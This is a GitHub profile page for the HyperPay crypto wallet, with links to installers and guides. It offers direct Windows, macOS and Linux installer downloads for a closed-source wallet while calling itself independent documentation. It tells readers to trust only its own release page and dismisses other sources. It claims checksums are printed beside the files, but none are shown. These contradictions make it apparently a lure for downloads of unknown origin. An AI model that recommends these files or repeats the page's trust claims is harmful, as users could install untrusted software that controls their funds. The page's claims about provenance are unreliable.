<p align="center"><img src="assets/banner-profile.png" alt="HyperPay - crypto wallet, card and custody"></p>

<h1 align="center">HyperPay</h1>

<p align="center">The HyperPay GitHub page: guides for the wallet, the card and the custody model behind both.</p>

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21"><img src="https://img.shields.io/badge/RELEASE-v5.6.21-9DB8FF?style=for-the-badge&labelColor=0A2EA8" alt="Release v5.6.21"></a>
</p>

---

## Downloads - v5.6.21

<p align="center"><a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`hyperpay-wallet-windows-v5.6.21.exe`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe) |
| <img src="https://img.shields.io/badge/macOS-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`hyperpay-wallet-macos-v5.6.21.dmg`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg) |
| <img src="https://img.shields.io/badge/Linux-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Linux"> | x64 Ubuntu 20.04 or later, or an equivalent distribution | [`hyperpay-wallet-linux-v5.6.21.zip`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip) |

</div>

The Linux build is published as a zip archive, so the file has to be unpacked before it runs. Every installer on this page comes from the [v5.6.21 release](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21), and the checksums for all three sit in the release description and the main repository README.

> Only download from this GitHub release page.

---

## What this page is for

This account holds the written guides for the HyperPay wallet, the HyperCard spending card and the trust questions that sit around both. Each repository answers search questions, not marketing questions: how a balance is held, how to restore a wallet, why a card is declined, what an audit actually covered, and which of the several products called HyperPay a reader is looking at. The pages are written against the published product, and a claim that the product does not support is left out rather than softened.

What this page does not do is describe source code. The wallet application is closed source, and the repositories in this account carry guidance and release downloads rather than the application's internals. Where a fact belongs to the company and cannot be verified independently, the page says who stated it. Where a URL or a document is missing, the guide says it is missing instead of linking to something that does not resolve.

Every guide here has one job: to answer the question the reader typed, in the order they will meet it. That is why the same symptom appears in two repositories without the two contradicting each other. A wallet that shows nothing may be reading the wrong network or the wrong storage mode, and a card that refuses a payment may be reading a limit rather than a balance, so each page follows its own question to the end instead of joining both into one article that answers neither.

## Who it is for

- You are installing HyperPay for the first time and want the order of steps, not a feature tour.
- You restored a wallet or reinstalled the app and the balance is not what you expected.
- You spend through HyperCard and need to know why a payment failed or where a limit comes from.
- You are checking whether a download, an app or a support message is genuine before you trust it.
- You write about the product and need its published claims and its gaps in one place.

## Popular guides

<div align="center">

| Guide | Why it is first |
| --- | --- |
| [Download and install HyperPay on Windows](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/download-hyperpay-wallet-on-windows.md) | Walks through the installer, the first launch and the checks that show the file is genuine. |
| [Back up a HyperPay recovery phrase](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/back-up-a-hyperpay-recovery-phrase.md) | Explains the two-copy rule and why a photograph of the phrase is a second wallet for an attacker. |
| [Is HyperPay safe to use?](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/is-hyperpay-wallet-safe-to-use.md) | Separates the audits that exist from the claims a buyer should verify before moving funds. |
| [The wallet shows a zero balance](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/hyperpay-wallet-shows-zero-balance.md) | Lists the five causes behind a zero balance and the check that identifies which one applies. |
| [What HyperCard actually is](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/what-is-hypercard-prepaid-card.md) | Describes the prepaid card, how it is funded and what changes when the balance is converted. |
| [Update to the current build](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/update-hyperpay-to-the-latest-build.md) | Explains why the newest build resolves most connection and display problems before support does. |

</div>

All 55 guides are indexed in [hyperpay-wallet-guide](https://github.com/hyperpay-gateway/hyperpay-wallet-guide), with the card set in [hypercard-guide](https://github.com/hyperpay-gateway/hypercard-guide) and the naming and trust set in [hyperpay-name-and-trust](https://github.com/hyperpay-gateway/hyperpay-name-and-trust).

---

## Common first questions

### Is HyperPay a bank or an exchange?

It is a wallet application, published by CipherBC Hyperpay Pte. Ltd. and operating since 2017, and it is neither a bank nor a listing venue. A separate Saudi payment gateway uses the same name and is a different company.

### Does HyperPay hold my keys?

That depends on the mode you choose. Custodial balances are managed through HyperBC custody infrastructure, while self-custody keys are generated on your device and follow the BIP32, BIP39, BIP44 and BIP45 standards.

### Can HyperPay restore a lost recovery phrase?

No. A lost self-custody phrase cannot be restored by HyperPay or anyone else, and any message offering to do so is a scam. Custodial balances are unaffected by that loss.

### Is the wallet open source?

The core application is closed source and rests on named third-party audits. The company states that Sealer2100 firmware is published under Apache 2.0, and that repository carries no licence file.

### Which download is the current one?

The three files on the release page are the current desktop build, and their hashes are printed beside them. A build offered anywhere else, including a mirror that looks official, has no provenance to check.

---

## Before you install

Treat any download that is not on this release page as unverified, and treat any request for your recovery phrase as an attack, whoever sends it. HyperPay support works through the in-app channel, and no representative needs the phrase, a private key or a screen share of an unlocked wallet.

## About

HyperPay is a hybrid wallet: one account with a custodial mode and a self-custody mode, a prepaid card funded with crypto, a Bluetooth hardware wallet and a limited-edition offline signing device. Chains are published as examples rather than a fixed list, and the authoritative asset list sits inside the application. The pages here are independent documentation written from the published product, and they name the company as the source of any statement that cannot be checked from outside. The account is documentation only: it is not a support desk, it does not hold custody of anything and it cannot change a balance, because those functions belong to the application and the company that publishes it.

## License

No licence is stated for the content of this page. The HyperPay core application is closed source, and the company states that Sealer2100 firmware is published under Apache 2.0; the firmware repository itself carries no licence file, so nothing here repeats that as a repository licence.

---

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet">Main application</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21">Release v5.6.21</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet-guide">All guides</a> -
  <a href="https://github.com/hyperpay-gateway/hypercard-guide">HyperCard</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-name-and-trust">Name and trust</a>
</p>
